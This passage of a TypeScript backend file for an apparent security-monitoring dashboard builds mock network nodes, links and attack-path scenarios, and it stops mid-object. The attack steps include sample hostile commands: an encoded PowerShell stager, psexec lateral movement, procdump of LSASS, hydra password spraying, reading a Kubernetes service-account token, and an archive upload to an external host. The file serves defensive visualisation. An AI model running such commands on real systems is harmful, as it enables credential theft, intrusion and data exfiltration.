import { db } from './db';
import {
  FusionGraphData,
  FusionGraphNode,
  FusionGraphLink,
  AttackPath,
  AttackPathStep,
  BlastSimulationScenario,
  BlastSimulationResult,
  ThreatExportReport,
} from '../src/types';

export function buildAssetFusionGraph(): FusionGraphData {
  const activeIncidents = db.incidents.filter((i) => i.status !== 'RESOLVED');
  const criticalAlerts = db.cecurAlerts.filter((a) => a.ruleLevel >= 12);
  const suspiciousSessions = db.activtrakSessions.filter((s) => s.riskScore > 75);

  // Cross-reference real agents from DB
  const dcAgent = db.cecurAgents.find((a) => a.id === 'cecur-ag-002');
  const finAgent = db.cecurAgents.find((a) => a.id === 'cecur-ag-004');
  const webAgent = db.cecurAgents.find((a) => a.id === 'cecur-ag-001');
  const k8sAgent = db.cecurAgents.find((a) => a.id === 'cecur-ag-003');
  const macAgent = db.cecurAgents.find((a) => a.id === 'cecur-ag-005');
  const dbAgent = db.cecurAgents.find((a) => a.id === 'cecur-ag-006');

  // Cross-reference real sensors from DB
  const edgeSensor = db.sensors.find((s) => s.id === 'sensor-cs3-01');
  const dmzSensor = db.sensors.find((s) => s.id === 'sensor-cs3-02');
  const dbSensor = db.sensors.find((s) => s.id === 'sensor-cs3-03');
  const cloudSensor = db.sensors.find((s) => s.id === 'sensor-cs3-04');
  const otSensor = db.sensors.find((s) => s.id === 'sensor-cs3-05');

  const nodes: FusionGraphNode[] = [
    // --- ZONE 0: ENCLAVE CORE (Crown Jewels) ---
    {
      id: 'node-dc-primary',
      label: dcAgent?.name || 'corp-ad-dc-primary',
      type: 'domain_controller',
      ip: dcAgent?.ip || '10.100.1.5',
      zone: 'INTERNAL',
      threatLevel: activeIncidents.some((i) => i.affectedAssets.some((a) => a.includes('10.100.1.5') || a.includes('corp-ad-dc-primary')))
        ? 'CRITICAL'
        : 'NOMINAL',
      compromised: true,
      blastRadius: 92,
      x: 380,
      y: 190,
      os: dcAgent?.os.name || 'Windows Server 2025 Datacenter',
      cpuUsage: dcAgent?.cpuUsage || 78,
      memoryUsage: dcAgent?.memoryUsage || 84,
      vulnerabilitiesCount: dcAgent?.vulnerabilitiesCount || { critical: 3, high: 7, medium: 12 },
      activeAlertsCount: db.cecurAlerts.filter((a) => a.agentIp === '10.100.1.5' || a.fullLog.includes('10.100.1.5')).length || 6,
      connectedUser: 'SYSTEM (Kerberos Ticket Granting Service - KDC)',
      services: ['Active Directory DS', 'DNS Server', 'Kerberos KDC', 'SMB / RPC Service', 'Cecur XDR Fleet v2.4.0'],
      mitreTechniques: [
        'T1003.001 (OS Credential Dumping: LSASS Memory)',
        'T1558.003 (Kerberoasting / Golden Ticket)',
        'T1021.002 (SMB/PsExec Execution)',
      ],
      agentId: 'cecur-ag-002',
      criticality: 'TIER_0_MISSION_CRITICAL',
      assetValueUSD: 2400000,
      complianceTags: ['NIST_800_53_AC_6', 'PCI_DSS_10.2.5', 'ISO27001_A9'],
      linkedIncidentIds: ['INC-2026-0841'],
      linkedAlertIds: ['cecur-alt-89420', 'cecur-alt-89417'],
      linkedSensorIds: ['sensor-cs3-03'],
      scaScore: dcAgent?.scaScore || 94,
      fimMonitoredFilesCount: dcAgent?.fimMonitoredFilesCount || 2850,
      installedPackagesCount: dcAgent?.installedPackagesCount || 412,
      quarantined: dcAgent?.isolationStatus || false,
    },
    {
      id: 'node-db-vault',
      label: dbAgent?.name || 'gcp-cloud-vault-db',
      type: 'db_cluster',
      ip: dbAgent?.ip || '10.200.12.88',
      zone: 'INTERNAL',
      threatLevel: 'ELEVATED',
      compromised: false,
      blastRadius: 88,
      x: 380,
      y: 360,
      os: dbAgent?.os.name || 'Red Hat Enterprise Linux 9.4',
      cpuUsage: dbAgent?.cpuUsage || 64,
      memoryUsage: dbAgent?.memoryUsage || 88,
      vulnerabilitiesCount: dbAgent?.vulnerabilitiesCount || { critical: 1, high: 3, medium: 8 },
      activeAlertsCount: 3,
      connectedUser: 'postgres_svc (High-Availability DB Cluster Node)',
      services: ['PostgreSQL 16.2 Enterprise', 'Patroni Cluster', 'pgBackRest', 'TLS Encryption Tap'],
      mitreTechniques: ['T1213 (Data From Information Repositories)', 'T1078 (Valid Service Accounts)'],
      agentId: 'cecur-ag-006',
      criticality: 'TIER_0_MISSION_CRITICAL',
      assetValueUSD: 3800000,
      complianceTags: ['HIPAA_164.312', 'PCI_DSS_3.4', 'GDPR_Art_32'],
      linkedIncidentIds: ['INC-2026-0841'],
      linkedAlertIds: [],
      linkedSensorIds: ['sensor-cs3-03'],
      scaScore: dbAgent?.scaScore || 98,
      fimMonitoredFilesCount: dbAgent?.fimMonitoredFilesCount || 3400,
      installedPackagesCount: dbAgent?.installedPackagesCount || 512,
      quarantined: dbAgent?.isolationStatus || false,
    },

    // --- ZONE 1: INTERNAL WORKLOADS & ENDPOINTS ---
    {
      id: 'node-ws-fin-104',
      label: finAgent?.name || 'workstation-fin-104',
      type: 'workstation',
      ip: finAgent?.ip || '10.100.8.44',
      zone: 'INTERNAL',
      threatLevel: 'CRITICAL',
      compromised: true,
      blastRadius: 76,
      x: 210,
      y: 220,
      os: finAgent?.os.name || 'Windows 11 Enterprise (23H2)',
      cpuUsage: finAgent?.cpuUsage || 92,
      memoryUsage: finAgent?.memoryUsage || 71,
      vulnerabilitiesCount: finAgent?.vulnerabilitiesCount || { critical: 2, high: 4, medium: 9 },
      activeAlertsCount: db.cecurAlerts.filter((a) => a.agentIp === '10.100.8.44').length || 4,
      connectedUser: 'e.turner@corp.local (Finance Controller)',
      services: ['Cecur XDR Agent v2.4.0', 'WinRM', 'Cortana Sync', 'Local Spooler Service'],
      mitreTechniques: [
        'T1566.001 (Phishing: Malicious Attachment)',
        'T1059.001 (PowerShell Execution)',
        'T1021.002 (SMB/PsExec Pivoting)',
      ],
      agentId: 'cecur-ag-004',
      criticality: 'TIER_1_HIGH',
      assetValueUSD: 450000,
      complianceTags: ['PCI_DSS_8.2', 'NIST_800_53_AC_6'],
      linkedIncidentIds: ['INC-2026-0841'],
      linkedAlertIds: ['cecur-alt-89420'],
      linkedSensorIds: ['sensor-cs3-02'],
      scaScore: finAgent?.scaScore || 68,
      fimMonitoredFilesCount: finAgent?.fimMonitoredFilesCount || 1100,
      installedPackagesCount: finAgent?.installedPackagesCount || 620,
      quarantined: finAgent?.isolationStatus || true,
    },
    {
      id: 'node-k8s-worker',
      label: k8sAgent?.name || 'k8s-prod-worker-eu-04',
      type: 'workstation',
      ip: k8sAgent?.ip || '10.240.8.22',
      zone: 'INTERNAL',
      threatLevel: 'NOMINAL',
      compromised: false,
      blastRadius: 55,
      x: 210,
      y: 360,
      os: k8sAgent?.os.name || 'Alpine Linux 3.20 (Container Node)',
      cpuUsage: k8sAgent?.cpuUsage || 72,
      memoryUsage: k8sAgent?.memoryUsage || 81,
      vulnerabilitiesCount: k8sAgent?.vulnerabilitiesCount || { critical: 0, high: 0, medium: 2 },
      activeAlertsCount: 1,
      connectedUser: 'k8s-service-account (API Microservices Pod Worker)',
      services: ['Docker/Containerd', 'Kubelet v1.30', 'Calico CNI', 'Cecur Container Tap'],
      mitreTechniques: ['T1611 (Escape to Host)', 'T1046 (Network Service Discovery)'],
      agentId: 'cecur-ag-003',
      criticality: 'TIER_1_HIGH',
      assetValueUSD: 720000,
      complianceTags: ['GDPR_Art_32', 'CIS_Kubernetes_1.8'],
      linkedIncidentIds: ['INC-2026-0835'],
      linkedAlertIds: [],
      linkedSensorIds: ['sensor-cs3-04'],
      scaScore: k8sAgent?.scaScore || 91,
      fimMonitoredFilesCount: k8sAgent?.fimMonitoredFilesCount || 680,
      installedPackagesCount: k8sAgent?.installedPackagesCount || 198,
      quarantined: k8sAgent?.isolationStatus || false,
    },
    {
      id: 'node-mac-exec',
      label: macAgent?.name || 'mac-executive-ops-01',
      type: 'workstation',
      ip: macAgent?.ip || '10.100.12.89',
      zone: 'INTERNAL',
      threatLevel: 'NOMINAL',
      compromised: false,
      blastRadius: 40,
      x: 280,
      y: 120,
      os: macAgent?.os.name || 'macOS Sonoma 14.6.1 (Apple M3 Max)',
      cpuUsage: macAgent?.cpuUsage || 12,
      memoryUsage: macAgent?.memoryUsage || 41,
      vulnerabilitiesCount: macAgent?.vulnerabilitiesCount || { critical: 0, high: 0, medium: 1 },
      activeAlertsCount: 0,
      connectedUser: 'victoria.zhao@cecur-it.internal (CISO Executive)',
      services: ['MDM Enrollment Profile', 'FileVault 2', 'YubiKey SSO Token Daemon'],
      mitreTechniques: [],
      agentId: 'cecur-ag-005',
      criticality: 'TIER_1_HIGH',
      assetValueUSD: 350000,
      complianceTags: ['NIST_800_53_IA_2', 'HIPAA_164.312'],
      linkedIncidentIds: [],
      linkedAlertIds: [],
      linkedSensorIds: ['sensor-cs3-01'],
      scaScore: macAgent?.scaScore || 96,
      fimMonitoredFilesCount: macAgent?.fimMonitoredFilesCount || 950,
      installedPackagesCount: macAgent?.installedPackagesCount || 480,
      quarantined: macAgent?.isolationStatus || false,
    },

    // --- ZONE 2: DMZ & EDGE PERIMETER ---
    {
      id: 'node-dmz-web-01',
      label: webAgent?.name || 'dmz-web-ingress-prod-01',
      type: 'web_server',
      ip: webAgent?.ip || '172.16.20.14',
      zone: 'DMZ',
      threatLevel: criticalAlerts.some((a) => a.agentIp === '172.16.20.14') ? 'HIGH' : 'NOMINAL',
      compromised: false,
      blastRadius: 48,
      x: 540,
      y: 190,
      os: webAgent?.os.name || 'Ubuntu 24.04 LTS (Noble Numbat)',
      cpuUsage: webAgent?.cpuUsage || 42,
      memoryUsage: webAgent?.memoryUsage || 58,
      vulnerabilitiesCount: webAgent?.vulnerabilitiesCount || { critical: 1, high: 2, medium: 5 },
      activeAlertsCount: db.cecurAlerts.filter((a) => a.agentIp === '172.16.20.14').length || 2,
      connectedUser: 'www-data (Nginx reverse-proxy worker pool)',
      services: ['Nginx 1.26', 'Node.js Gateway', 'ModSecurity WAF v3', 'Let\'s Encrypt Daemon'],
      mitreTechniques: ['T1190 (Exploit Public-Facing Application)', 'T1110.001 (Password Guessing)'],
      agentId: 'cecur-ag-001',
      criticality: 'TIER_2_MEDIUM',
      assetValueUSD: 650000,
      complianceTags: ['PCI_DSS_10.2.4', 'PCI_DSS_6.5', 'NIST_800_53_AC_7'],
      linkedIncidentIds: ['INC-2026-0835'],
      linkedAlertIds: ['cecur-alt-89421'],
      linkedSensorIds: ['sensor-cs3-02'],
      scaScore: webAgent?.scaScore || 86,
      fimMonitoredFilesCount: webAgent?.fimMonitoredFilesCount || 1420,
      installedPackagesCount: webAgent?.installedPackagesCount || 842,
      quarantined: webAgent?.isolationStatus || false,
    },
    {
      id: 'node-edge-fw',
      label: 'edge-perimeter-ngfw-01',
      type: 'firewall',
      ip: edgeSensor?.ipAddress || '10.100.4.1',
      zone: 'EDGE',
      threatLevel: 'NOMINAL',
      compromised: false,
      blastRadius: 32,
      x: 680,
      y: 200,
      os: 'Palo Alto PAN-OS 11.1 (App-ID Threat Prevention)',
      cpuUsage: edgeSensor?.cpuUsage || 34,
      memoryUsage: edgeSensor?.memoryUsage || 58,
      vulnerabilitiesCount: { critical: 0, high: 0, medium: 2 },
      activeAlertsCount: edgeSensor?.alerts24h || 18,
      connectedUser: 'admin_sys (GlobalProtect VPN Gateway)',
      services: ['BGP Routing Engine', 'IPsec Site-to-Site VPN', 'GlobalProtect Tap', 'SSL Decryption Proxy'],
      mitreTechniques: ['T1571 (Non-Standard Port Egress)'],
      agentId: 'sensor-cs3-01',
      criticality: 'TIER_1_HIGH',
      assetValueUSD: 980000,
      complianceTags: ['PCI_DSS_1.1', 'NIST_800_53_SC_7'],
      linkedIncidentIds: ['INC-2026-0839'],
      linkedAlertIds: [],
      linkedSensorIds: ['sensor-cs3-01'],
      scaScore: 95,
      fimMonitoredFilesCount: 420,
      installedPackagesCount: 310,
      quarantined: false,
    },
    {
      id: 'node-cs3-tap-dmz',
      label: dmzSensor?.name || 'CS3-DMZ-MIRROR-BETA',
      type: 'sensor_tap',
      ip: dmzSensor?.ipAddress || '172.16.20.5',
      zone: 'DMZ',
      threatLevel: dmzSensor?.status === 'DEGRADED' ? 'HIGH' : 'NOMINAL',
      compromised: false,
      blastRadius: 38,
      x: 540,
      y: 330,
      os: 'CS3 Hardened Packet Tap OS v4.8.1',
      cpuUsage: dmzSensor?.cpuUsage || 89,
      memoryUsage: dmzSensor?.memoryUsage || 91,
      vulnerabilitiesCount: { critical: 0, high: 1, medium: 3 },
      activeAlertsCount: dmzSensor?.alerts24h || 142,
      connectedUser: 'cs3-probe-daemon (Full-Packet Deep Inspection)',
      services: ['eBPF Flow Recorder', 'Zeek Network Security Monitor', 'Suricata IDS Engine'],
      mitreTechniques: ['T1040 (Network Sniffing)'],
      agentId: 'sensor-cs3-02',
      criticality: 'TIER_2_MEDIUM',
      assetValueUSD: 280000,
      complianceTags: ['NIST_800_53_SI_4', 'PCI_DSS_10.2.1'],
      linkedIncidentIds: ['INC-2026-0841'],
      linkedAlertIds: [],
      linkedSensorIds: ['sensor-cs3-02'],
      scaScore: 92,
      fimMonitoredFilesCount: 310,
      installedPackagesCount: 160,
      quarantined: false,
    },

    // --- ZONE 3: CLOUD INFRASTRUCTURE & PARTNER ENDPOINTS ---
    {
      id: 'node-cloud-s3',
      label: 'gcp-prod-data-vault',
      type: 'cloud_s3',
      ip: cloudSensor?.ipAddress || '10.240.0.10',
      zone: 'CLOUD',
      threatLevel: 'NOMINAL',
      compromised: false,
      blastRadius: 65,
      x: 680,
      y: 380,
      os: 'CS3 Cloud Platform Storage API (TLS 1.3)',
      cpuUsage: cloudSensor?.cpuUsage || 18,
      memoryUsage: cloudSensor?.memoryUsage || 32,
      vulnerabilitiesCount: { critical: 0, high: 1, medium: 1 },
      activeAlertsCount: cloudSensor?.alerts24h || 47,
      connectedUser: 'gcp-service-acct@corp-prod.iam.gserviceaccount.com',
      services: ['CS3 Cloud Storage Bucket', 'Cloud KMS AES-256 GCM', 'Pub/Sub Audit Log Stream'],
      mitreTechniques: ['T1567.002 (Exfiltration to Cloud Storage)'],
      agentId: 'sensor-cs3-04',
      criticality: 'TIER_1_HIGH',
      assetValueUSD: 1850000,
      complianceTags: ['HIPAA_164.312(a)(2)(iv)', 'GDPR_Art_32', 'PCI_DSS_3.4'],
      linkedIncidentIds: ['INC-2026-0839'],
      linkedAlertIds: [],
      linkedSensorIds: ['sensor-cs3-04'],
      scaScore: 98,
      fimMonitoredFilesCount: 1500,
      installedPackagesCount: 88,
      quarantined: false,
    },
    {
      id: 'node-contractor-lap',
      label: 'LAPTOP-ENG-4412',
      type: 'workstation',
      ip: '192.168.4.88',
      zone: 'EDGE',
      threatLevel: suspiciousSessions.some((s) => s.deviceId.includes('ENG')) ? 'HIGH' : 'NOMINAL',
      compromised: false,
      blastRadius: 42,
      x: 140,
      y: 440,
      os: 'macOS Sonoma 14.5 ARM64',
      cpuUsage: 38,
      memoryUsage: 62,
      vulnerabilitiesCount: { critical: 0, high: 2, medium: 6 },
      activeAlertsCount: 2,
      connectedUser: 'emp-dev-441 (David K. - Contractor)',
      services: ['MegaSync.exe', 'Docker Desktop', 'Tailscale VPN Client', 'VS Code Remote Daemon'],
      mitreTechniques: [
        'T1078.004 (Valid Accounts: Cloud Accounts)',
        'T1567 (Exfiltration Over Web Service)',
      ],
      agentId: 'at-sess-9021',
      criticality: 'TIER_3_LOW',
      assetValueUSD: 120000,
      complianceTags: ['NIST_800_53_AC_6', 'PCI_DSS_12.3'],
      linkedIncidentIds: ['INC-2026-0839'],
      linkedAlertIds: ['at-sess-9021'],
      linkedSensorIds: ['sensor-cs3-01'],
      scaScore: 74,
      fimMonitoredFilesCount: 520,
      installedPackagesCount: 390,
      quarantined: false,
    },
  ];

  const links: FusionGraphLink[] = [
    // 1. Lateral Movement: Finance Workstation -> Domain Controller (Active Threat)
    {
      id: 'link-1',
      source: 'node-ws-fin-104',
      target: 'node-dc-primary',
      type: 'lateral_movement',
      threat: true,
      protocol: 'SMB / RPC (Port 445)',
      port: 445,
      bandwidthMbps: 48.2,
      mitreTechnique: 'T1021.002 (SMB/PsExec Remote Execution & RPC Injection)',
      description: 'Active lateral movement attempt utilizing stolen domain controller admin token over PsExec.',
      activeStatus: 'ACTIVE',
      latencyMs: 1.4,
    },
    // 2. Auth Flow: Domain Controller -> DB Vault Cluster (Active Threat)
    {
      id: 'link-2',
      source: 'node-dc-primary',
      target: 'node-db-vault',
      type: 'auth_flow',
      threat: true,
      protocol: 'Kerberos / LDAP (Port 88)',
      port: 88,
      bandwidthMbps: 12.4,
      mitreTechnique: 'T1558.003 (Kerberoasting / Golden Ticket Pass-the-Ticket)',
      description: 'Unauthorized Kerberos ticket escalation requesting service ticket for PostgreSQL db_vault principal.',
      activeStatus: 'ACTIVE',
      latencyMs: 0.8,
    },
    // 3. Traffic: Edge Firewall -> DMZ Web Ingress (Nominal)
    {
      id: 'link-3',
      source: 'node-edge-fw',
      target: 'node-dmz-web-01',
      type: 'traffic',
      threat: false,
      protocol: 'HTTPS / TLS 1.3 (Port 443)',
      port: 443,
      bandwidthMbps: 145.0,
      mitreTechnique: 'N/A (Legitimate Ingress Traffic)',
      description: 'Inbound TLS client traffic routed via perimeter Palo Alto NGFW to Nginx ingress.',
      activeStatus: 'ACTIVE',
      latencyMs: 2.1,
    },
    // 4. Traffic: DMZ Web Ingress -> DB Vault (Nominal Backend Stream)
    {
      id: 'link-4',
      source: 'node-dmz-web-01',
      target: 'node-db-vault',
      type: 'traffic',
      threat: false,
      protocol: 'PostgreSQL TCP (Port 5432)',
      port: 5432,
      bandwidthMbps: 8.5,
      mitreTechnique: 'N/A (Internal DB Backend Query Flow)',
      description: 'Sanitized SQL query stream from DMZ Web Application to PostgreSQL Database Enclave.',
      activeStatus: 'ACTIVE',
      latencyMs: 1.1,
    },
    // 5. Auth Flow: DMZ Web Ingress -> Domain Controller (Nominal SSO)
    {
      id: 'link-5',
      source: 'node-dmz-web-01',
      target: 'node-dc-primary',
      type: 'auth_flow',
      threat: false,
      protocol: 'LDAPS (Port 636)',
      port: 636,
      bandwidthMbps: 2.1,
      mitreTechnique: 'N/A (Web SSO LDAP Auth Query)',
      description: 'Web SSO authentication query against Active Directory Domain Controller.',
      activeStatus: 'ACTIVE',
      latencyMs: 1.6,
    },
    // 6. Exfiltration Path: Contractor Laptop -> Edge FW -> Cloud Vault (Active Threat)
    {
      id: 'link-6',
      source: 'node-contractor-lap',
      target: 'node-cloud-s3',
      type: 'exfiltration_path',
      threat: true,
      protocol: 'HTTPS REST API (Port 443)',
      port: 443,
      bandwidthMbps: 88.9,
      mitreTechnique: 'T1567.002 (Exfiltration Over Cloud Storage API)',
      description: 'High-volume encrypted POST requests transferring compressed tar.gz archives to external cloud bucket.',
      activeStatus: 'ACTIVE',
      latencyMs: 14.5,
    },
    // 7. Backbone: Edge Firewall -> Cloud Vault (Nominal Cloud Transit)
    {
      id: 'link-7',
      source: 'node-edge-fw',
      target: 'node-cloud-s3',
      type: 'traffic',
      threat: false,
      protocol: 'CS3 Cloud Interconnect',
      port: 443,
      bandwidthMbps: 310.0,
      mitreTechnique: 'N/A (Cloud Sync Transit)',
      description: 'Backbone sync connection between edge Palo Alto NGFW and CS3 Enterprise VPC.',
      activeStatus: 'ACTIVE',
      latencyMs: 3.2,
    },
    // 8. Traffic: DMZ Sensor Tap -> DMZ Web Ingress
    {
      id: 'link-8',
      source: 'node-cs3-tap-dmz',
      target: 'node-dmz-web-01',
      type: 'traffic',
      threat: false,
      protocol: 'eBPF Mirror (Port 4789)',
      port: 4789,
      bandwidthMbps: 210.0,
      mitreTechnique: 'N/A (Deep Packet Telemetry Mirror)',
      description: 'Mirror tap capturing ingress packets for anomaly classification and rule matches.',
      activeStatus: 'ACTIVE',
      latencyMs: 0.3,
    },
    // 9. Lateral link: DMZ Web Ingress -> K8s Worker Pod (Pivot Vector)
    {
      id: 'link-9',
      source: 'node-dmz-web-01',
      target: 'node-k8s-worker',
      type: 'lateral_movement',
      threat: false,
      protocol: 'gRPC / HTTP2 (Port 8080)',
      port: 8080,
      bandwidthMbps: 45.0,
      mitreTechnique: 'T1190 (Exploit Public-Facing Application -> Microservice Ingress)',
      description: 'Microservice API reverse-proxy forwarder to container workload cluster.',
      activeStatus: 'ACTIVE',
      latencyMs: 0.9,
    },
  ];

  // Multiple fully developed Attack Paths aligned with real backend Incidents
  const attackPaths: AttackPath[] = [
    {
      id: 'path-apt-lateral-01',
      name: 'APT Lateral Movement & Domain Controller LSASS Memory Extraction',
      severity: 'CRITICAL',
      status: 'ACTIVE_THREAT',
      associatedIncidentId: 'INC-2026-0841',
      summary: 'Threat actor leveraged initial phishing foothold on finance workstation, elevated privileges via obfuscated PowerShell, pivoted laterally using PsExec to primary Domain Controller, and extracted credential hashes via LSASS memory dump.',
      estimatedTimeMinutes: 45,
      potentialImpact: 'Total Enterprise Active Directory compromise, Kerberos ticket forgery (Golden Ticket), unconstrained access to PostgreSQL database vault cluster.',
      steps: [
        {
          stepNumber: 1,
          title: 'Initial Access: Phishing Attachment Stager',
          stage: 'INITIAL_FOOTHOLD',
          sourceNodeId: 'node-ws-fin-104',
          targetNodeId: 'node-ws-fin-104',
          mitreTactic: 'Initial Access (TA0001)',
          mitreTechnique: 'T1566.001 - Phishing: Malicious Attachment',
          description: 'User opened macro-embedded spreadsheet containing PowerShell stager payload.',
          protocol: 'HTTP/HTTPS Downloader',
          payloadCommand: 'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
          detectionSource: 'ActivTrak Behavioral Engine & Cecur Agent v2.4.0',
          confidence: 98,
          remediationAction: 'Isolate workstation-fin-104 into Quarantine VLAN and terminate PowerShell process.',
        },
        {
          stepNumber: 2,
          title: 'Privilege Escalation: Local Token Impersonation',
          stage: 'PRIVILEGE_ESCALATION',
          sourceNodeId: 'node-ws-fin-104',
          targetNodeId: 'node-ws-fin-104',
          mitreTactic: 'Privilege Escalation (TA0004)',
          mitreTechnique: 'T1059.001 - PowerShell Command Execution & Token Impersonation',
          description: 'Obfuscated PowerShell script invoked token duplicate API impersonating svc_backup_acct service account.',
          protocol: 'Win32 API / Local IPC',
          payloadCommand: 'Invoke-TokenImpersonation -Username "svc_backup_acct" -Domain "CORP"',
          detectionSource: 'Cecur SIEM Rule 10015 (Suspicious Token Duplication)',
          confidence: 95,
          remediationAction: 'Revoke Kerberos TGT and invalidate service account credentials globally.',
        },
        {
          stepNumber: 3,
          title: 'Lateral Movement: SMB / PsExec Infiltration',
          stage: 'LATERAL_PIVOT',
          sourceNodeId: 'node-ws-fin-104',
          targetNodeId: 'node-dc-primary',
          mitreTactic: 'Lateral Movement (TA0008)',
          mitreTechnique: 'T1021.002 - SMB/PsExec Execution & RPC Injection',
          description: 'Stolen Domain Admin credentials used to execute remote service installation on primary Domain Controller (10.100.1.5).',
          protocol: 'SMB / RPC (Port 445)',
          payloadCommand: 'psexec.exe \\\\10.100.1.5 -u CORP\\svc_backup_acct -p [REDACTED] cmd.exe',
          detectionSource: 'CS3-DMZ-MIRROR-BETA RPC anomaly detection (4.62% spike)',
          confidence: 99,
          remediationAction: 'Block SMB TCP 445 cross-subnet traffic and sever lateral link.',
        },
        {
          stepNumber: 4,
          title: 'Credential Dumping: LSASS Memory Extraction',
          stage: 'CREDENTIAL_ACCESS',
          sourceNodeId: 'node-dc-primary',
          targetNodeId: 'node-dc-primary',
          mitreTactic: 'Credential Access (TA0006)',
          mitreTechnique: 'T1003.001 - OS Credential Dumping: LSASS Memory',
          description: 'Procdump64 utility executed on corp-ad-dc-primary targeting lsass.exe to extract NTLM hashes and Kerberos tickets.',
          protocol: 'Local Process Injection / OpenProcess',
          payloadCommand: 'procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp',
          detectionSource: 'Cecur XDR Alert 89420 (Rule Level 15 - Memory Dump)',
          confidence: 100,
          remediationAction: 'Collect memory forensics package and trigger enterprise-wide KRBTGT password reset.',
        },
        {
          stepNumber: 5,
          title: 'Targeted Vault Access: Pass-the-Ticket & Data Extraction',
          stage: 'EXFILTRATION',
          sourceNodeId: 'node-dc-primary',
          targetNodeId: 'node-db-vault',
          mitreTactic: 'Collection & Exfiltration (TA0009 / TA0010)',
          mitreTechnique: 'T1558.003 - Kerberoasting / Pass-the-Ticket to Database Enclave',
          description: 'Forged Kerberos service ticket presented to PostgreSQL DB Vault cluster to query confidential financial and customer tables.',
          protocol: 'PostgreSQL TCP (Port 5432) via Kerberos Ticket',
          payloadCommand: 'klist purge && kerberos_inject.py --tgt --spn postgres/db-vault.corp.local',
          detectionSource: 'CS3 Core DB Probe Gamma (TLS handshake mismatch)',
          confidence: 94,
          remediationAction: 'Enforce microsegmentation boundary on DB Enclave and restrict DB access to DMZ app pool only.',
        },
      ],
    },
    {
      id: 'path-insider-cloud-02',
      name: 'Insider Risk: High-Volume Egress to Unapproved Cloud Bucket',
      severity: 'HIGH',
      status: 'CONTAINED',
      associatedIncidentId: 'INC-2026-0839',
      summary: 'Contractor device initiated unauthorized multi-gigabyte upload to external sync storage containing compressed engineering source archives.',
      estimatedTimeMinutes: 25,
      potentialImpact: 'Proprietary IP exposure, unauthorized storage of customer data in foreign jurisdiction.',
      steps: [
        {
          stepNumber: 1,
          title: 'Endpoint Abuse: Local Source Archive Staging',
          stage: 'DATA_STAGING',
          sourceNodeId: 'node-contractor-lap',
          targetNodeId: 'node-contractor-lap',
          mitreTactic: 'Collection (TA0009)',
          mitreTechnique: 'T1074.001 - Data Staging: Local Data Staging',
          description: 'Contractor compressed 1.4 GB of source code repositories into password-protected zip archives.',
          protocol: 'Local Disk I/O',
          payloadCommand: 'tar -czvf /tmp/source_dump_2026.tar.gz /workspace/core-repos/*',
          detectionSource: 'ActivTrak Session at-sess-9021',
          confidence: 96,
          remediationAction: 'Lock contractor local disk access and audit recent git pull operations.',
        },
        {
          stepNumber: 2,
          title: 'Egress Transit: Edge Firewall Direct Connection',
          stage: 'LATERAL_PIVOT',
          sourceNodeId: 'node-contractor-lap',
          targetNodeId: 'node-edge-fw',
          mitreTactic: 'Command and Control (TA0011)',
          mitreTechnique: 'T1571 - Non-Standard Egress Port Transit',
          description: 'MegaSync client established multiple parallel HTTPS connections pushing archives through edge NGFW.',
          protocol: 'TLS 1.3 / TCP 443',
          payloadCommand: 'MegaSync.exe --upload /tmp/source_dump_2026.tar.gz',
          detectionSource: 'CS3-EDGE-GW-ALPHA Sensor Alert (1.4 GB Egress)',
          confidence: 92,
          remediationAction: 'Deploy DNS sinkhole and firewall drop rule for unauthorized cloud storage endpoints.',
        },
        {
          stepNumber: 3,
          title: 'Exfiltration: External Cloud Bucket Delivery',
          stage: 'EXFILTRATION',
          sourceNodeId: 'node-edge-fw',
          targetNodeId: 'node-cloud-s3',
          mitreTactic: 'Exfiltration (TA0010)',
          mitreTechnique: 'T1567.002 - Exfiltration to Cloud Storage',
          description: 'Final delivery of compressed payload into unapproved external bucket storage.',
          protocol: 'REST API HTTPS',
          payloadCommand: 'POST https://storage.external-provider.com/v1/objects',
          detectionSource: 'Cecur Cloud Connector Audit Log',
          confidence: 90,
          remediationAction: 'Revoke cloud IAM tokens and report incident to legal/HR.',
        },
      ],
    },
    {
      id: 'path-dmz-k8s-03',
      name: 'External DMZ Ingress to Kubernetes Container Escape',
      severity: 'HIGH',
      status: 'SIMULATED',
      associatedIncidentId: 'INC-2026-0835',
      summary: 'Simulated brute-force attack on public DMZ ingress web proxy followed by microservice payload injection and container breakout attempt.',
      estimatedTimeMinutes: 30,
      potentialImpact: 'Container cluster takeover, unauthorized access to internal database microservice APIs.',
      steps: [
        {
          stepNumber: 1,
          title: 'Perimeter Reconnaissance: SSH & Web Spraying',
          stage: 'INITIAL_FOOTHOLD',
          sourceNodeId: 'node-edge-fw',
          targetNodeId: 'node-dmz-web-01',
          mitreTactic: 'Initial Access (TA0001)',
          mitreTechnique: 'T1110.003 - Password Spraying & Port Scanning',
          description: 'External IP pool attempted 14 authentication requests against DMZ SSH and Web Gateway in 30 seconds.',
          protocol: 'SSH / HTTPS (Port 22 & 443)',
          payloadCommand: 'hydra -L users.txt -P passwords.txt ssh://172.16.20.14',
          detectionSource: 'Cecur Alert cecur-alt-89421 (Rule Level 12)',
          confidence: 97,
          remediationAction: 'Drop external source IP at Edge Firewall and enable fail2ban jail.',
        },
        {
          stepNumber: 2,
          title: 'Microservice Pivot: WAF Bypass & gRPC Injection',
          stage: 'LATERAL_PIVOT',
          sourceNodeId: 'node-dmz-web-01',
          targetNodeId: 'node-k8s-worker',
          mitreTactic: 'Lateral Movement (TA0008)',
          mitreTechnique: 'T1190 - Exploit Public-Facing Application to Internal Service',
          description: 'Malformed payload bypassed edge WAF filter to invoke internal microservice management endpoint on Kubernetes node.',
          protocol: 'gRPC / HTTP2 (Port 8080)',
          payloadCommand: 'POST /v1/cluster/admin/exec -H "Authorization: Bearer <spoofed_token>"',
          detectionSource: 'ModSecurity WAF Alert & eBPF Tap',
          confidence: 89,
          remediationAction: 'Enforce mutual TLS (mTLS) on all ingress-to-pod communications.',
        },
        {
          stepNumber: 3,
          title: 'Container Escape: Service Account Token Extraction',
          stage: 'PRIVILEGE_ESCALATION',
          sourceNodeId: 'node-k8s-worker',
          targetNodeId: 'node-k8s-worker',
          mitreTactic: 'Privilege Escalation (TA0004)',
          mitreTechnique: 'T1611 - Escape to Host & Token Harvesting',
          description: 'Extracted cluster-admin service account token from mounted secrets volume.',
          protocol: 'Kubernetes Internal API',
          payloadCommand: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
          detectionSource: 'Cecur Container FIM Engine',
          confidence: 91,
